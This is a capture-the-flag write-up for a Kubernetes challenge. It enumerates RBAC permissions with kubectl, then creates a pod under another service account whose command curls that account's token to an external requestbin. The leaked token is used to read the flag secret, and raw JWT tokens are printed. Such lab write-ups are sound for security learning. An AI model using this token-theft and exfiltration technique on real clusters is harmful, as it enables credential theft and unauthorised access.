# CentauriKube
Category: Research / Kubernetes

## Description

> Cyborg1337, we need your help!
> 
> Global warming is damaging our planet, and we need to find a new place to live.
> 
> Go on our spaceship and find an earth-like planet in the near star system "Alpha Centauri".
> 
> The full instructions can be found by connecting to the spaceship terminal: http://34.214.198.14:8080/

## Solution


Let's connect to the terminal:

```console
     Earth 2104
    ,-:` \;',`'-,
  .'-;_,;  ':-;_,'
 /;   '/    ,  _`.-\
| '`. (`     /` ` \`|
|:.  `\`-.   \_   / |
|     (   `,  .`\ ;'|
 \     | .'     `-'/
  `.   ;/        .'
    `'-._____.

Welcome Aboard cyborg-1337!
Global warming threatens to ruin our planet (NAMESPACE "earth"), we already past the point of no return, we must find a new home!
You were chosen for this life-saving mission.
We need you to use the warp drive spacecraft we have (the only one, so keep it safe!) to go to "alpha-centauri" (NAMESPACE) star system.
We suspect that there is an earth-like planet orbiting the star using our telescopes: "alpha-centauri-b".
We need you to go near "alpha-centauri-b", and search for the earth-like planet. We named it "centauri1337". Figure out this SECRET and understand if we can live there.
We and everyone on Earth are counting on you,
Good Luck,

Ground Control
[cyborg-1337@earth]#
```

We get a shell, and can enter different commands. The terms "namespace" and "secret" mentioned in the welcome message have relevance in the Kubernetes world, and must be a hint.

Let's start by looking around a bit:

```console
[cyborg-1337@earth]# whoami
root
[cyborg-1337@earth]# pwd
/home
[cyborg-1337@earth]# ls -alR
.:
total 8
drwxr-xr-x 2 root root 4096 Apr 15  2020 .
drwxr-xr-x 1 root root 4096 Jul 18 18:21 ..
```

We're running as root, that's good. Nothing else in the immediate area. 

Assuming we're running inside a Kubernetes pod, the [documentation](https://kubernetes.io/docs/tasks/access-application-cluster/access-cluster/#accessing-the-api-from-a-pod) claims that we can access the API from within a pod by connecting to the API Server at `kubernetes.default.svc` with the service account credentials from `/var/run/secrets/kubernetes.io/serviceaccount/token`:

```console
[cyborg-1337@earth]# cat /var/run/secrets/kubernetes.io/serviceaccount/token
eyJhbGciOiJSUzI1NiIsImtpZCI6ImZEZkl3bGtFVF9GYWpsTWx3ZDVqSEt2QVlaM3B4RnVwbDF3WWwyM0k3MGcifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJlYXJ0aCIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJjeWJvcmctMTMzNy10b2tlbi05Z3ZjcyIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50Lm5hbWUiOiJjeWJvcmctMTMzNyIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50LnVpZCI6Ijg3YTFiNzk1LWJiYmUtNDFjNC1iMmVkLWUzMzdlNTliNTE4MiIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDplYXJ0aDpjeWJvcmctMTMzNyJ9.09IAfeemd4gGTF_cGwaAojPm5G05QnCkgUbbSzodCd1WDcN1HS0iQ-1wU7gdqN3pq3aHR9ayKgXFPDaUgXbnVIwEdoepsn5ldN3Q4ID5UBlLwJSlNC8XkxHLUEOYjdB-qZUWUAASCcP3540R7OZ8ldyd-0rlnR7r7L6rDMmP-JbwKnn3lsa2NBkeBYqjtsOowetgDFzS3px6dRN2uI2uLGPnjBGtSike-gHIy8bqGcNHR6parOVrfIhoHU6m6DrzkVn3NyB66SjBJ8E6jaW0Bzr_DGtvLcpmfjbiMd8gNph3kpvZdzTj0StFgXiszgDs0wS3mI5g1kd7DKzgRuv0Cg
```

Let's setup some convenience environment variables:

```console
[cyborg-1337@earth]# export APISERVER=https://kubernetes.default.svc
[cyborg-1337@earth]# export SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount
[cyborg-1337@earth]# export TOKEN=$(cat ${SERVICEACCOUNT}/token)
```

The next thing we should do is setup the Kubernetes command-line tool (`kubectl`) if possible, for easier interaction with the API. The [installation instructions](https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/#install-using-native-package-management) explain how to install the tool with the native package manager. We just need to make sure we install curl first.

```console
[cyborg-1337@earth]# kubectl version
Client Version: version.Info{Major:"1", Minor:"21", GitVersion:"v1.21.3", GitCommit:"ca643a4d1f7bfe34773c74f79527be4afd95bf39", GitTreeState:"clean", BuildDate:"2021-07-15T21:04:39Z", GoVersion:"go1.16.6", Compiler:"gc", Platform:"linux/amd64"}
The connection to the server localhost:8080 was refused - did you specify the right host or port?
```

Obviously we should go straight for the secrets:

```console
[cyborg-1337@earth]# kubectl --token "${TOKEN}" --server="${APISERVER}" --insecure-skip-tls-verify=true get secrets
Error from server (Forbidden): secrets is forbidden: User "system:serviceaccount:earth:cyborg-1337" cannot list resource "secrets" in API group "" in the namespace "default"
[cyborg-1337@earth]# kubectl --token "${TOKEN}" --server="${APISERVER}" --insecure-skip-tls-verify=true --namespace=earth get secrets
Error from server (Forbidden): secrets is forbidden: User "system:serviceaccount:earth:cyborg-1337" cannot list resource "secrets" in API group "" in the namespace "earth"
[cyborg-1337@earth]# kubectl --token "${TOKEN}" --server="${APISERVER}" --insecure-skip-tls-verify=true --namespace=alpha-centauri get secrets
Error from server (Forbidden): secrets is forbidden: User "system:serviceaccount:earth:cyborg-1337" cannot list resource "secrets" in API group "" in the namespace "alpha-centauri"
```

No luck.

The next thing we'd like to do is understand what our user is authorized to perform within our namespace, via the following command:

```console
[cyborg-1337@earth]# kubectl --token "${TOKEN}" --server="${APISERVER}" --insecure-skip-tls-verify=true --namespace=earth auth can-i --list
Resources                                       Non-Resource URLs                     Resource Names   Verbs
selfsubjectaccessreviews.authorization.k8s.io   []                                    []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                    []               [create]
                                                [/.well-known/openid-configuration]   []               [get]
                                                [/api/*]                              []               [get]
                                                [/api]                                []               [get]
                                                [/apis/*]                             []               [get]
                                                [/apis]                               []               [get]
                                                [/healthz]                            []               [get]
                                                [/healthz]                            []               [get]
                                                [/livez]                              []               [get]
                                                [/livez]                              []               [get]
                                                [/openapi/*]                          []               [get]
                                                [/openapi]                            []               [get]
                                                [/openid/v1/jwks]                     []               [get]
                                                [/readyz]                             []               [get]
                                                [/readyz]                             []               [get]
                                                [/version/]                           []               [get]
                                                [/version/]                           []               [get]
                                                [/version]                            []               [get]
                                                [/version]                            []               [get]
pods.*                                          []                                    []               [list]
```

We can list pods, so let's do that:

```console
[cyborg-1337@earth]# kubectl --token "${TOKEN}" --server="${APISERVER}" --insecure-skip-tls-verify=true --namespace=earth get pods
NAME        READY   STATUS    RESTARTS   AGE
home-hint   1/1     Running   0          14d
```

There's a pod names `home-hint`. Perhaps it contains a hint? We can dump full details by adding `-o yaml`:

```console
[cyborg-1337@earth]# kubectl --token "${TOKEN}" --server="${APISERVER}" --insecure-skip-tls-verify=true --namespace=earth get pods -o yaml
apiVersion: v1
items:
- apiVersion: v1
  kind: Pod
  metadata:
    annotations:
      hint: https://www.cyberark.com/resources/threat-research-blog/securing-kubernetes-clusters-by-eliminating-risky-permissions
      kubectl.kubernetes.io/last-applied-configuration: |
        {"apiVersion":"v1","kind":"Pod","metadata":{"annotations":{"hint":"https://www.cyberark.com/resources/threat-research-blog/securing-kubernetes-clusters-by-eliminating-risky-permissions"},"name":"home-hint","namespace":"earth"},"spec":{"containers":[{"args":["-c","sleep infinity"],"command":["/bin/sh"],"image":"ubuntu","name":"home"}]}}
    creationTimestamp: "2021-07-04T08:07:52Z"
    name: home-hint
    namespace: earth
    resourceVersion: "879740"
    uid: df381947-d1f6-41bf-972c-3c80f75c5277
  spec:
    containers:
    - args:
      - -c
      - sleep infinity
      command:
      - /bin/sh
      image: ubuntu
      imagePullPolicy: Always
      name: home
      resources: {}
      terminationMessagePath: /dev/termination-log
      terminationMessagePolicy: File
      volumeMounts:
      - mountPath: /var/run/secrets/kubernetes.io/serviceaccount
        name: default-token-f2q6t
        readOnly: true
    dnsPolicy: ClusterFirst
    enableServiceLinks: true
    nodeName: ip-172-31-37-46
    preemptionPolicy: PreemptLowerPriority
    priority: 0
    restartPolicy: Always
    schedulerName: default-scheduler
    securityContext: {}
    serviceAccount: default
    serviceAccountName: default
    terminationGracePeriodSeconds: 30
    tolerations:
    - effect: NoExecute
      key: node.kubernetes.io/not-ready
      operator: Exists
      tolerationSeconds: 300
    - effect: NoExecute
      key: node.kubernetes.io/unreachable
      operator: Exists
      tolerationSeconds: 300
    volumes:
    - name: default-token-f2q6t
      secret:
        defaultMode: 420
        secretName: default-token-f2q6t
  status:
    conditions:
    - lastProbeTime: null
      lastTransitionTime: "2021-07-04T08:07:52Z"
      status: "True"
      type: Initialized
    - lastProbeTime: null
      lastTransitionTime: "2021-07-04T08:07:55Z"
      status: "True"
      type: Ready
    - lastProbeTime: null
      lastTransitionTime: "2021-07-04T08:07:55Z"
      status: "True"
      type: ContainersReady
    - lastProbeTime: null
      lastTransitionTime: "2021-07-04T08:07:52Z"
      status: "True"
      type: PodScheduled
    containerStatuses:
    - containerID: docker://f27e5366e70e1eba11b67280f329c4708726461fcef34f8a3c6750e0b36ad9c6
      image: ubuntu@sha256:aba80b77e27148d99c034a987e7da3a287ed455390352663418c0f2ed40417fe
      imageID: docker-pullable://ubuntu@sha256:aba80b77e27148d99c034a987e7da3a287ed455390352663418c0f2ed40417fe
      lastState: {}
      name: home
      ready: true
      restartCount: 0
      started: true
      state:
        running:
          startedAt: "2021-07-04T08:07:54Z"
    hostIP: 172.31.37.46
    phase: Running
    podIP: 172.17.0.7
    podIPs:
    - ip: 172.17.0.7
    qosClass: BestEffort
    startTime: "2021-07-04T08:07:52Z"
kind: List
metadata:
  resourceVersion: ""
  selfLink: ""
```

Indeed, we got a hint in the form of a link to the [CyberArk blog](https://www.cyberark.com/resources/threat-research-blog/securing-kubernetes-clusters-by-eliminating-risky-permissions).

The description told us that we need to move to the `alpha-centauri` namespace, let's see what we can do there:

```console
[cyborg-1337@earth]# kubectl --token "${TOKEN}" --server="${APISERVER}" --insecure-skip-tls-verify=true --namespace=alpha-centauri auth can-i --list
Resources                                       Non-Resource URLs                     Resource Names   Verbs
pods.*                                          []                                    []               [create get]
selfsubjectaccessreviews.authorization.k8s.io   []                                    []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                    []               [create]
                                                [/.well-known/openid-configuration]   []               [get]
                                                [/api/*]                              []               [get]
                                                [/api]                                []               [get]
                                                [/apis/*]                             []               [get]
                                                [/apis]                               []               [get]
                                                [/healthz]                            []               [get]
                                                [/healthz]                            []               [get]
                                                [/livez]                              []               [get]
                                                [/livez]                              []               [get]
                                                [/openapi/*]                          []               [get]
                                                [/openapi]                            []               [get]
                                                [/openid/v1/jwks]                     []               [get]
                                                [/readyz]                             []               [get]
                                                [/readyz]                             []               [get]
                                                [/version/]                           []               [get]
                                                [/version/]                           []               [get]
                                                [/version]                            []               [get]
                                                [/version]                            []               [get]
serviceaccounts.*                               []                                    []               [list get]
podsecuritypolicies.*                           []                                    []               [use]
```

This is good news: Over there, we can create and get pods, list and get service accounts and use pod security policies. We'll start by reading the service accounts for `alpha-centauri`:

```console
[cyborg-1337@earth]# kubectl --token "${TOKEN}" --server="${APISERVER}" --insecure-skip-tls-verify=true --namespace=alpha-centauri get serviceaccounts
NAME               SECRETS   AGE
alpha-centauri-a   1         14d
alpha-centauri-b   1         14d
default            1         19d
proxima            1         19d
```

The description told us we should be interested in `alpha-centauri-b`. As the blog post suggested, let's try to create a pod with the `alpha-centauri-b` service account in order to steal their token and possibly escalate privileges. We do that by leaking their token using a requestbin:

```console
[cyborg-1337@earth]# kubectl --token "${TOKEN}" --server="${APISERVER}" --insecure-skip-tls-verify=true --namespace=alpha-centauri create -f- <<EOF
> apiVersion: v1
> kind: Pod
> metadata:
>   name: mypod
>   namespace: alpha-centauri
> spec:
>   containers:
>     - name: mypod
>       image: ubuntu
>       command: ["/bin/sh"]
>       args: ["-c","apt update && apt install -y curl; curl -X POST https://enx36dubz6vd.x.pipedream.net/ -d @/var/run/secrets/kubernetes.io/serviceaccount/token; sleep infinity"]
>   serviceAccountName: alpha-centauri-b
>   automountServiceAccountToken: true
> EOF
pod/mypod created
```

A few seconds later, we get a hit in our requestbin with the token:

```
eyJhbGciOiJSUzI1NiIsImtpZCI6ImZEZkl3bGtFVF9GYWpsTWx3ZDVqSEt2QVlaM3B4RnVwbDF3WWwyM0k3MGcifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJhbHBoYS1jZW50YXVyaSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJhbHBoYS1jZW50YXVyaS1iLXRva2VuLXZ4djI4Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImFscGhhLWNlbnRhdXJpLWIiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiI2NzMxOTY4ZC1jYTZiLTQyNmYtYTZlNi1lM2ZlYTBjZGVmMmEiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6YWxwaGEtY2VudGF1cmk6YWxwaGEtY2VudGF1cmktYiJ9.ORxg24s9n23DZ2X651kV_vPH1WRkwDQnE2-1j14u2djpaD_Qz6chGO4MGH6uVnTKMn0xv7MA2N7NisHCm9_NzvUW7wKAKOWJEZ6o0yhaewKr8kNcqKdbmokOqJ5asFy_JHa671TF6WMOAmWTzY-2kbzX8ys9kCvkgG6cFhpYTAmmlM13sSnYDiXOa4X4juBwzNMJh-7KSMwwAAYOjKKTHyDdOHpw3N8mJMS7oCIpNdc9NMgCemokKhu6IXHUfa5szlDtUdQt7QYecwprrDn4fhzQiFo_l6Nt4LdTB9T2fmeY5FtGC1pyfAqotevvrRWO_FCVyfVcQlz7wSt60Wtuqg
```

We export it for convenience:

```console
[cyborg-1337@earth]# export TOKEN_ACB=eyJhbGciOiJSUzI1NiIsImtpZCI6ImZEZkl3bGtFVF9GYWpsTWx3ZDVqSEt2QVlaM3B4RnVwbDF3WWwyM0k3MGcifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZX
Rlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJhbHBoYS1jZW50YXVyaSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJhbHBoYS1jZW50YXVyaS1iLXRva2VuLXZ4djI4Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNj
b3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImFscGhhLWNlbnRhdXJpLWIiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiI2NzMxOTY4ZC1jYTZiLTQyNmYtYTZlNi1lM2ZlYTBjZGVmMmEiLCJzdWIiOiJzeXN0ZW
06c2VydmljZWFjY291bnQ6YWxwaGEtY2VudGF1cmk6YWxwaGEtY2VudGF1cmktYiJ9.ORxg24s9n23DZ2X651kV_vPH1WRkwDQnE2-1j14u2djpaD_Qz6chGO4MGH6uVnTKMn0xv7MA2N7NisHCm9_NzvUW7wKAKOWJEZ6o0yhaewKr8kNcqKdbmokOqJ5asFy_JHa
671TF6WMOAmWTzY-2kbzX8ys9kCvkgG6cFhpYTAmmlM13sSnYDiXOa4X4juBwzNMJh-7KSMwwAAYOjKKTHyDdOHpw3N8mJMS7oCIpNdc9NMgCemokKhu6IXHUfa5szlDtUdQt7QYecwprrDn4fhzQiFo_l6Nt4LdTB9T2fmeY5FtGC1pyfAqotevvrRWO_FCVyfVcQ
lz7wSt60Wtuqg
```

Now let's check what they (we) can do:

```console
[cyborg-1337@earth]# kubectl --token "${TOKEN_ACB}" --server="${APISERVER}" --insecure-skip-tls-verify=true --namespace=alpha-centauri auth can-i --list
Resources                                       Non-Resource URLs                     Resource Names   Verbs
selfsubjectaccessreviews.authorization.k8s.io   []                                    []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                    []               [create]
                                                [/.well-known/openid-configuration]   []               [get]
                                                [/api/*]                              []               [get]
                                                [/api]                                []               [get]
                                                [/apis/*]                             []               [get]
                                                [/apis]                               []               [get]
                                                [/healthz]                            []               [get]
                                                [/healthz]                            []               [get]
                                                [/livez]                              []               [get]
                                                [/livez]                              []               [get]
                                                [/openapi/*]                          []               [get]
                                                [/openapi]                            []               [get]
                                                [/openid/v1/jwks]                     []               [get]
                                                [/readyz]                             []               [get]
                                                [/readyz]                             []               [get]
                                                [/version/]                           []               [get]
                                                [/version/]                           []               [get]
                                                [/version]                            []               [get]
                                                [/version]                            []               [get]
secrets.*                                       []                                    []               [list get]
```

We can list secrets!

Let's check the secrets:

```console
[cyborg-1337@earth]# kubectl --token "${TOKEN_ACB}" --server="${APISERVER}" --insecure-skip-tls-verify=true --namespace=alpha-centauri get secrets
NAME                           TYPE                                  DATA   AGE
alpha-centauri-a-token-lvgsq   kubernetes.io/service-account-token   3      14d
alpha-centauri-b-token-vxv28   kubernetes.io/service-account-token   3      14d
centauri1337                   Opaque                                1      19d
default-token-2rjmf            kubernetes.io/service-account-token   3      19d
proxima-token-nwpj4            kubernetes.io/service-account-token   3      19d
```

The description pointed us to `centauri1337`:

```console
[cyborg-1337@earth]# kubectl --token "${TOKEN_ACB}" --server="${APISERVER}" --insecure-skip-tls-verify=true --namespace=alpha-centauri get secrets centauri1337 -o yaml
apiVersion: v1
data:
  flag: Q1lCUnthMVBoYV9jM243YXVyMV8xc195MHVyX24zd19oMG0zfQo=
kind: Secret
metadata:
  annotations:
    kubectl.kubernetes.io/last-applied-configuration: |
      {"apiVersion":"v1","data":{"flag":"Q1lCUnthMVBoYV9jM243YXVyMV8xc195MHVyX24zd19oMG0zfQo="},"kind":"Secret","metadata":{"annotations":{},"name":"centauri1337","namespace":"alpha-centauri"}}
  creationTimestamp: "2021-06-29T07:24:23Z"
  name: centauri1337
  namespace: alpha-centauri
  resourceVersion: "458843"
  uid: 50542046-a97d-4473-aaec-4aff03b22388
type: Opaque
```

We got the flag:

```console
[cyborg-1337@earth]# echo Q1lCUnthMVBoYV9jM243YXVyMV8xc195MHVyX24zd19oMG0zfQo= | base64 -d
CYBR{a1Pha_c3n7aur1_1s_y0ur_n3w_h0m3}
```